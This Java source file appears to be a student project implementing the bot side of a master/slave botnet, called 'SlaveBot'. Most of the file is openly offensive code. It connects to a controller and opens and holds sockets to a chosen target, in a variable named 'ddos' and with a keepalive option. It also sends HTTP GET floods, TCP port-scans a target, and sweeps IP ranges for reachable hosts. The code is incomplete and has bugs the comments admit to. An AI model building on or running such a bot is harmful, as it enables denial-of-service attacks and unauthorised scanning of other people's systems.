package pkg206.tp.p1;
import java.net.*;
import java.util.*;
import java.io.*;

public class SlaveBot extends Thread
{
    
    
    
	// variable declarations
	static ArrayList<Socket> remoteConnected = new ArrayList<>();
        ArrayList<Integer> tcpPortAvailable = new ArrayList<>();

	Socket ddos;
	
	// main
	public static void main(String[] args) 
	{
		int port = 0;
		String ip = null;
		
		// for connection
		if(args.length != 0)
		{
			// input example = "-h localhost -p 9999"
			if (args.length == 4) 
			{
				ip = args[1];
				port = Integer.parseInt(args[3]);
			}
			
			try
			{
				Socket client = new Socket(ip, port);
				System.out.println("Connected To Server " + client.getRemoteSocketAddress());


			} catch(IOException e)
			{
				e.printStackTrace();
			}
		}
                		while(true)
		{
			Scanner reader = new Scanner(System.in);
			String line = reader.nextLine();
			String[] dataArray = line.split("\\s+");
			
			// loop if no data is entered
			if (line.equals("")) 
			{
				continue;
			}
			// display ArrayList of Clients
			else if (line.equalsIgnoreCase("connectedToRemoteHost")) 
			{
				System.out.println("connectedToRemoteHost");
				continue;
			}
			//exit function logic
			else if (line.equalsIgnoreCase("exit") || line.equalsIgnoreCase("quit") || line.equalsIgnoreCase("-1"))
			{
				System.out.println("Program Terminated.");
				System.exit(0);
			}
			// input format example = -h localhost -p 9999
			else if(dataArray.length == 4)
			{
				ip = dataArray[1];
				port = Integer.parseInt(dataArray[3]);
			}
			//input format example = -h localhost 9999
			else if(dataArray.length == 3)
			{
				ip = dataArray[1];
				port = Integer.parseInt(dataArray[2]);
			}
			//for random input format
			else
			{
				System.out.println(dataArray);
				System.out.println("in else");
				continue;
			}
			
			try
			{
				Socket client = new Socket(ip, port);
				System.out.println("Connected To Server" + client.getRemoteSocketAddress());
			} catch(IOException e)
			{
				e.printStackTrace();
			}
		}
		
	}

	// connect function
	public void connect(Socket selectedSlave, String targetIP, int targetPort, String keepAliveOrURL) throws IOException
	{
		try
		{
			ddos = new Socket();
			ddos.connect(new InetSocketAddress(targetIP, targetPort));
                        if (keepAliveOrURL.equalsIgnoreCase("keepalive")){
                        ddos.setKeepAlive(true);                            
                        }
			if(ddos.isConnected())
			{
				remoteConnected.add(ddos);
                            if (keepAliveOrURL.equalsIgnoreCase("keepalive")){
				System.out.println("Slave " + selectedSlave.getRemoteSocketAddress() + " is connected to " + ddos.getInetAddress() + " through port number " + ddos.getPort() + " & keepalive option is set");                                
                            }
                            else if(keepAliveOrURL.startsWith("url=")){
                             PrintWriter pw = new PrintWriter(selectedSlave.getOutputStream());
                             
                                pw.print("GET " + keepAliveOrURL + " HTTP/1.1\r\n");
                                pw.println("Host: " + targetIP + "\r\n\r\n");
                                pw.flush();
                                BufferedReader br = new BufferedReader(new InputStreamReader(selectedSlave.getInputStream()));
                                String t;
                                while((t = br.readLine()) != null) System.out.println(t);
                                br.close();
                                // error over here not sure why
                                
                            }
                            else{
                            System.out.println("Slave " + selectedSlave.getRemoteSocketAddress() + " is connected to " + ddos.getInetAddress() + " through port number " + ddos.getPort());                            

                            }
                               

			}
			
		} catch(IOException e)
		{
			System.out.println("ERROR! (Connect)");
			e.printStackTrace();
		}
	}

        // disconnect function (can't seem to close specific slaves since local port keeps changing after it's added to the array. Can't udnestand why)
	public void disconnect(Socket selectedSlave, String targetIP, int targetPort) throws IOException
	{
		try
		{
			for(int i=0; i<remoteConnected.size(); i++)
			{
                                                System.out.println("The connection to "+remoteConnected.get(i).getRemoteSocketAddress()+" "+remoteConnected.get(i).getLocalPort()+" is closed.");
						remoteConnected.get(i).close();
						remoteConnected.remove(i);

						break;
				
			}
			
		} catch(IOException e)
		{
			System.out.println("ERROR! (Disconnect)");
			e.printStackTrace();
		}
	}
        
        	public void tcpportscan(Socket selectedSlave, String targetIP, int targetPortStart, int targetPortEnd) throws IOException
                
                {
                    
                    
                    for(int i=targetPortStart; i<= targetPortEnd; i++)
			{
//                                                                                                             System.out.println("Received DATA " + targetPortStart + " " + targetPortEnd);

				ddos = new Socket();
				try{
				int timeOut = 200; 
		         ddos.connect(new InetSocketAddress(targetIP,i),timeOut);
		         if(ddos.isConnected()){
//		        	 System.out.println(i +" ,");
                                 tcpPortAvailable.add(i);
		        	 ddos.close();
//                                                                                 System.out.println("connected and Received DATA " + targetPortStart + " " + targetPortEnd);

		         }
		         }catch(Exception e){
//		        	 		        	 System.out.println(e);

		        	 continue;
		         }
				
				}
                    
                    System.out.println(selectedSlave + " Available Ports");
                    
                    for (int i=0; i<tcpPortAvailable.size(); i++){
                        
                        
                    	 System.out.printf(tcpPortAvailable.get(i) +" ,");

                }
                    tcpPortAvailable.clear();
                                        	 System.out.println("\n");

                }
                
                public void ipscan(Socket selectedSlave, String targetIPStart, String targetIPEnd ) throws IOException
		{
			boolean result;
			 long startInt=ipToDecimal(targetIPStart);
			 long endInt=ipToDecimal(targetIPEnd);
			 long diff=endInt-startInt;
			 
                         
                         
			try{
				int m=0;
				int n=0;
				
				
				for(long i=startInt; i<=endInt; i++)
			
			 {
					String address = decimalToIp(i);   
			       
					result=isReachable(address,80,1000);
			      
			        m++;
			        
				if (result) { 
					n++;
		            System.out.printf( address +",  ");
				
				}
				if(m==diff+1){
					if(n==0)
					System.out.println("No reply received");
					break;
				}
					
				
			 }
					
				
				
			 }catch(Exception e){
		            System.out.println("Exception: " + e.getMessage());
			 }
			 					System.out.println("\n");

			 
		}
                
                private static boolean isReachable(String addr, int openPort, int timeOutMillis) {
		    // Checks for any open port
                    //default openPort = 80
		    try {
		        try (Socket soc = new Socket()) {
		            soc.connect(new InetSocketAddress(addr, openPort), timeOutMillis);
		        }
		        return true;
		    } catch (IOException e) {
		        return false;
		    }
		}
                
                public long ipToDecimal(String ipAddress) {

			long result = 0;
					System.out.println(ipAddress);

			String[] ipAddressInArray = ipAddress.split("\\.");
                        
//                        					System.out.println(ipAddressInArray);


			for (int i = 3; i >= 0; i--) {

				long ip = Long.parseLong(ipAddressInArray[3 - i]);

				
				result |= ip << (i * 8);

			}

			return result;
			  }
                
                public String decimalToIp(long i) {

			String loIp=((i >> 24) & 0xFF) +
	                   "." + ((i >> 16) & 0xFF) +
	                   "." + ((i >> 8) & 0xFF) +
	                   "." + (i & 0xFF);
			
          return loIp;
		}
                
                
        //httpconnect
        
        
        


}
